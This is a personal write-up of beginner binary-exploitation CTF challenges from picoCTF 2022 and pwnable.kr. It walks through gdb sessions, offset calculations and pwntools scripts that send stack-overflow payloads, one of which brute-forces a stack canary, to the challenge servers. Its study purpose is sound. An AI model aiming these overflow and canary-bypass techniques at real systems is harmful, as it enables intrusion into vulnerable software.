---
permalink: /misc/pwn
title: pwn
---

<br>

Websites with pwn challs:

<https://play.picoctf.org/practice?category=6>

<https://pwnable.kr>

<https://pwnable.tw>

<https://ropemporium.com>

<https://www.smashthestack.org/main.html>

<https://pwn.college>

<br>
<br>
<br>






# buffer overflow 1 - picoCTF 2022

<https://play.picoctf.org/practice/challenge/258>

My first ever pwn challenge... let's do it.

First I downloaded the vuln file and tried to run it.

```
$ ./vuln
bash: ./vuln: Permission denied
```

ok let's change the permissions.

```
$ chmod +x vuln 

$ ./vuln 
bash: ./vuln: cannot execute: required file not found
```

hmm weird. Let's get some more info

```
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

oh it's 32-bit, gotta install lib32-glibc.

```
$ sudo pacman -S lib32-glibc

$ ./vuln 
Please enter your string: 
test
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

cool now we can actually run the ELF.

Then I installed <https://github.com/pwndbg/pwndbg/tree/dev>

```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Then when you launch gdb you see the pwndbg extension being used.

```
$ gdb
...

pwndbg: loaded 154 pwndbg commands and 44 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections ''
pwndbg>
```

If you don't want to use the extension you can enable/disable it in `~/.gdbinit`:

```
set debuginfod enabled on
# source /home/connor/Documents/pwndbg/gdbinit.py
```

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

Note the vulnerable gets() function used, which we'll use to overflow buf and edit the EIP register to point to the win function. 


> EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.

Decompiling with IDA:

```
int vuln()
{
  int return_address; // eax
  char v2[36]; // [esp+0h] [ebp-28h] BYREF

  gets(v2);
  return_address = get_return_address();
  return printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", return_address);
}
```

The return_address int is 4 bytes, plus the char buffer is 36 bytes, plus the EBP is 4 bytes.

After those 44 we are overwriting the return address. Let's verify it:

```python
>>> 'A'*44 + 'BBBB'
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'
```

```
pwndbg> run
Starting program:  
No executable file specified.
Use the "file" or "exec-file" command.
pwndbg> exec-file vuln
pwndbg> run
Starting program: /home/connor/Desktop/vuln 
[Thread debugging using libthread_db enabled]                                                              
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Okay, time to return... Fingers Crossed... Jumping to 0x42424242

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
*EAX  0x41
*EBX  0x41414141 ('AAAA')
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049350 ◂— endbr32 
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd5f0 ◂— 0xffffff00
*EIP  0x42424242 ('BBBB')
────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────
Invalid address 0x42424242

...
```

And you can see `*EIP  0x42424242 ('BBBB')` we can control EIP by changing BBBB :) 

Now let's find the address of the win function. 

```
pwndbg> file vuln
Reading symbols from vuln...
Downloading separate debug info for /home/connor/Desktop/vuln
(No debugging symbols found in vuln)                                                                       
pwndbg> disassemble win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
...
```

We get `080491f6`, then converting to little endian, is `f6910408`.

Creating the payload:

```python
import sys
sys.stdout.buffer.write(b"A"*44 + bytes.fromhex('f6910408'))
```

```
[~/Desktop] 
$ python create_payload.py > payload 

[~/Desktop] 
$ ./vuln < payload 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.

[~/Desktop] 
$ echo "testflag" > flag.txt

[~/Desktop] 
$ ./vuln < payload 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
testflag
Segmentation fault (core dumped)
```

It works locally!

You can also use this function `from pwn import p32` to avoid manually converting to little endian.

```python
from pwn import p32, remote

payload = b"A"*44 + p32(0x080491f6)
io = remote("saturn.picoctf.net", 56437)
io.read()
io.sendline(payload)
io.interactive()
```

```
$ python solve.py 
[+] Opening connection to saturn.picoctf.net on port 56437: Done
[*] Switching to interactive mode
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```





<br>
<br>
<br>

# buffer overflow 2 - picoCTF 2022

<https://play.picoctf.org/practice/challenge/259>

```python
>>> 'a'*112 + 'BBBB'
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB'
```

```
pwndbg> run
...
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB

Program received signal SIGSEGV, Segmentation fault.
...
*EIP  0x42424242 ('BBBB')
```

```
pwndbg> disassemble win
Dump of assembler code for function win:
   0x08049296 <+0>:     endbr32
```

```python
from pwn import p32
import sys
payload = b"A"*112 + p32(0x08049296)
sys.stdout.buffer.write(payload)
```

This jumps to the win function but segfaults. Let's look at the win function:

```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```

We want to overwrite arg1 and arg2. 64-bit programs take function parameters from registers, <br>
but for 32-bit they're just read off the stack. 

Editing the payload:

```python
payload = b"A"*112 + p32(0x08049296) + b'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)
```

We can see we've changed the first 2 stack variables:

```
00:0000│ esp 0xffffd5f4 ◂— 0xcafef00d
01:0004│     0xffffd5f8 ◂— 0xf00df00d
02:0008│     0xffffd5fc ◂— 0x300
03:000c│     0xffffd600 —▸ 0xffffd620 ◂— 0x1
04:0010│     0xffffd604 —▸ 0xf7e1fe2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x21fd4c
05:0014│     0xffffd608 ◂— 0x0
06:0018│     0xffffd60c —▸ 0xf7c20af9 (__libc_start_call_main+121) ◂— add esp, 0x10
07:001c│     0xffffd610 ◂— 0x0
```

Printing the flag :)

```
$ ./vuln < payload
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AA�AAAA
testflag
```

```python
from pwn import p32, remote

payload = b"A"*112 + p32(0x08049296) + b'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)
io = remote("saturn.picoctf.net", 54716)
io.read()
io.sendline(payload)
io.read()
print(io.read())
```





<br>
<br>
<br>

# buffer overflow 3 - picoCTF 2022

<https://play.picoctf.org/practice/challenge/260>

```c
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

char global_canary[CANARY_SIZE];

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}
```

They've used a custom canary to try prevent buffer overflow, it's 4 bytes and checks if its value is the same as at the start of the program. 

```
[~/Desktop] 
$ ./vuln 
Please create 'canary.txt' in this directory with your own debugging canary.

[~/Desktop] 
$ echo "TEST" > canary.txt
```

memcmp() is being used to check if the current canary is the same as the global canary, but since we choose the buffer size, we can brute 1 byte at a time:

```
pwndbg> run
Starting program: /home/connor/Desktop/vuln 
Downloading separate debug info for system-supplied DSO at 0xf7fc7000                                      
[Thread debugging using libthread_db enabled]                                                              
Using host libthread_db library "/usr/lib/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 65                                                               
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT
Ok... Now Where's the Flag?
[Inferior 1 (process 106998) exited normally]
pwndbg> 
pwndbg> run
Starting program: /home/connor/Desktop/vuln 
[Thread debugging using libthread_db enabled]                                                              
Using host libthread_db library "/usr/lib/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 65
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX
***** Stack Smashing Detected ***** : Canary Value Corrupt!
[Inferior 1 (process 107001) exited normally]
```

```
pwndbg> p win
$1 = {<text variable, no debug info>} 0x8049336 <win>
```

```
pwndbg> run
Starting program: /home/connor/Desktop/vuln 
[Thread debugging using libthread_db enabled]                                                              
Using host libthread_db library "/usr/lib/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 100
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATESTBBBBBBBBBBBBBBBBCCCC
Ok... Now Where's the Flag?

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
 EAX  0x0
*EBX  0x42424242 ('BBBB')
 ECX  0x0
*EDX  0xf7e218a0 (_IO_stdfile_1_lock) ◂— 0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049640 (__libc_csu_init) ◂— endbr32 
*EBP  0x42424242 ('BBBB')
*ESP  0xffffd5f0 ◂— 0xffffff0a
*EIP  0x43434343 ('CCCC')
```

```
from pwn import p32
import sys
payload = b'A'*64 + b'TEST' + b'B'*16 + p32(0x8049336)
sys.stdout.buffer.write(b"100\n" + payload)
```

```
pwndbg> run < payload
Starting program: /home/connor/Desktop/vuln < payload
[Thread debugging using libthread_db enabled]                                                              
Using host libthread_db library "/usr/lib/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
Please create 'flag.txt' in this directory with your own debugging flag.
[Inferior 1 (process 107530) exited normally]
```

```python
from pwn import process, p32, context, remote
from tqdm import trange

def get_canary():
    canary = b""
    for i in range(1, 5):
        for c in trange(65, 256): #65 to speedup
            with context.quiet:
                #io = process("./vuln")
                io = remote("saturn.picoctf.net", 54767)
                io.sendlineafter(b"> ", str(64 + i).encode())
                io.sendlineafter(b"> ", b'A'*64 + canary + chr(c).encode())
                output = io.recvall()
                io.close()
            if b"?" in output:
                canary += chr(c).encode()
                break
    return canary

canary = get_canary()
print(canary)

#io = process("./vuln")
io = remote("saturn.picoctf.net", 54767)
io.sendlineafter(b"> ", b"100")
io.sendlineafter(b"> ", b'A'*64 + canary + b'B'*16 + p32(0x8049336))
print(io.read())
print(io.read())
# picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
```



<br>

# fd - pwnable.kr

Simply pass in 0x1234 so that the fd argument to the read function is 0 (stdin) then you can enter LETMEWIN

```
fd@pwnable:~$ ls
fd  fd.c  flag
fd@pwnable:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}

fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
fd@pwnable:~$ 
```

<br>

# collision - pwnable.kr

```python
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
            printf("%c\n", p[i]);
            printf("%d\n", ip[i]);
            res += ip[i];
        }
        return res;
}
```

We can see that a char array is converted to an int array. 

The size of ints in c is 2^32. The size of a char is 2^8. So each integer is comprised of 32/8=4 chars. 

In c they are also converted in little endian:


```c
#include <stdio.h>

unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
            printf("%d\n", ip[i]);
            res += ip[i];
        }
        return res;
}

int main() {
    char* s = "aabbccddeeffgghhiijj";
    unsigned long x = check_password(s);
    //printf("%lu\n", x);
}
```

```
[~/Desktop] 
$ gcc x.c && ./a.out
1650614625
1684300643
1717986661
1751672679
1785358697

[~/Desktop] 
$ python
Python 3.11.8 (main, Feb 12 2024, 14:50:05) [GCC 13.2.1 20230801] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> int.from_bytes(b"aabb", 'little')
1650614625
>>> int.from_bytes(b"ccdd", 'little')
1684300643
>>> int.from_bytes(b"eeff", 'little')
1717986661
>>> int.from_bytes(b"gghh", 'little')
1751672679
>>> int.from_bytes(b"iijj", 'little')
1785358697
>>> 
```

<br>

I can convert back and forth like so:

```python
>>> int.from_bytes(b"abcd", 'little')
1684234849
>>> long_to_bytes(1684234849)[::-1]
b'abcd'
```


```python
>>> 0x06C5CEC8 * 4 + 0x06C5CECC == 0x21DD09EC
True
```


```python
>>> from Crypto.Util.number import *
>>> def f(x):
...     return long_to_bytes(x)[::-1]
... 
>>> f(0x06C5CEC8)*4 + f(0x06C5CECC)
b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
```

```
col@pwnable:~$ ./col $(echo -e '\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06')
daddy! I just managed to create a hash collision :)
```


# bof - pwnable.kr

```v
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

My goal is to change the key to 0xcafebabe.

```
$ wget http://pwnable.kr/bin/bof

$ file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

It's a 32-bit binary. so I'll try the same technique from buffer overflow 2 - picoCTF 2022


```
$ gdb ./bof

...

pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000474  _init
0x000004c0  gets@plt
0x000004d0  __stack_chk_fail@plt
0x000004e0  __cxa_finalize@plt
0x000004f0  puts@plt
0x00000500  system@plt
0x00000510  __gmon_start__@plt
0x00000520  __libc_start_main@plt
0x00000530  _start
0x00000570  __do_global_dtors_aux
0x000005f0  frame_dummy
0x00000627  __i686.get_pc_thunk.bx
0x0000062c  func
0x0000068a  main
0x000006b0  __libc_csu_init
0x00000720  __libc_csu_fini
0x00000730  __do_global_ctors_aux
0x00000768  _fini
pwndbg> 
```

The key is currently 0xdeadbeef, let's set a breakpoint at func and then try find it on the stack. 

'x' is used to examine an address, you can see more with x/2, x/3 etc

```
pwndbg> break func
pwndbg> r

pwndbg> x/10 $ebp
0xffffd628:     -10680  1448433311      -559038737      0
0xffffd638:     0       0       0       0
0xffffd648:     0       -136754439
pwndbg> x/10x $ebp
0xffffd628:     0xffffd648      0x5655569f      0xdeadbeef      0x00000000
0xffffd638:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd648:     0x00000000      0xf7d94af9
pwndbg>
```

So we can see 0xdeadbeef is at $ebp+8

```
pwndbg> x $ebp
0xffffd628:     0xffffd648
pwndbg> x $ebp+4
0xffffd62c:     0x5655569f
pwndbg> x $ebp+8
0xffffd630:     0xdeadbeef
```


Now finding the address of our input:

```
$ gdb bof

...

pwndbg> break func
Breakpoint 1 at 0x56555632
pwndbg> r
Starting program: /home/connor/Desktop/bof 
...

pwndbg> n

pwndbg> n

pwndbg> n

pwndbg> n

pwndbg> n

pwndbg> n

pwndbg> n

pwndbg> n
AAAA
0x56555654 in func ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────
 EAX  0xffffd5fc ◂— 'AAAA'
 EBX  0xf7f93e2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x21fd4c
*ECX  0xf7f958ac (_IO_stdfile_0_lock) ◂— 0x0
 EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x565556b0 (__libc_csu_init) ◂— push ebp
 EBP  0xffffd628 —▸ 0xffffd648 ◂— 0x0
 ESP  0xffffd5e0 —▸ 0xffffd5fc ◂— 'AAAA'
*EIP  0x56555654 (func+40) ◂— cmp dword ptr [ebp + 8], 0xcafebabe
─────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────
   0x5655563d <func+17>    mov    dword ptr [esp], 0x5655578c
   0x56555644 <func+24>    call   puts                    <puts>
 
   0x56555649 <func+29>    lea    eax, [ebp - 0x2c]
   0x5655564c <func+32>    mov    dword ptr [esp], eax
   0x5655564f <func+35>    call   gets                    <gets>
 
 ► 0x56555654 <func+40>    cmp    dword ptr [ebp + 8], 0xcafebabe
   0x5655565b <func+47>    jne    func+63                    <func+63>
    ↓
   0x5655566b <func+63>    mov    dword ptr [esp], 0x565557a3
   0x56555672 <func+70>    call   puts                    <puts>
 
   0x56555677 <func+75>    mov    eax, dword ptr [ebp - 0xc]
   0x5655567a <func+78>    xor    eax, dword ptr gs:[0x14]
─────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ esp 0xffffd5e0 —▸ 0xffffd5fc ◂— 'AAAA'
01:0004│-044 0xffffd5e4 —▸ 0xffffd8cb —▸ 0xffa04e16 ◂— 0x0
02:0008│-040 0xffffd5e8 ◂— 0x0
03:000c│-03c 0xffffd5ec ◂— 0x1c
04:0010│-038 0xffffd5f0 —▸ 0xf7ffcfd0 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f18
05:0014│-034 0xffffd5f4 ◂— 0x30 /* '0' */
06:0018│-030 0xffffd5f8 ◂— 0x0
07:001c│ eax 0xffffd5fc ◂— 'AAAA'
───────────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► 0 0x56555654 func+40
   1 0x5655569f main+21
   2 0xf7d94af9 __libc_start_call_main+121
   3 0xf7d94bbd __libc_start_main+141
   4 0x56555561 _start+49
────────────────────────────────────────────────────────────────────────────────────
pwndbg> search AAAA
Searching for value: 'AAAA'
[heap]          0x565585b0 'AAAA\n'
[stack]         0xffffd5fc 'AAAA'
pwndbg>
```

so 0xffffd5fc in my case. 

```python
>>> 0xffffd630 - 0xffffd5fc
52
```

Testing our payload we can see it works:

```
pwndbg> x $ebp+8
0xffffd630:     0x42424242
```

<br>

```python
from pwn import p32, remote

io = remote("pwnable.kr", 9000)
print(io.read())
payload = b"A"*52 + p32(0xcafebabe)
io.sendline(payload)
io.interactive()
```
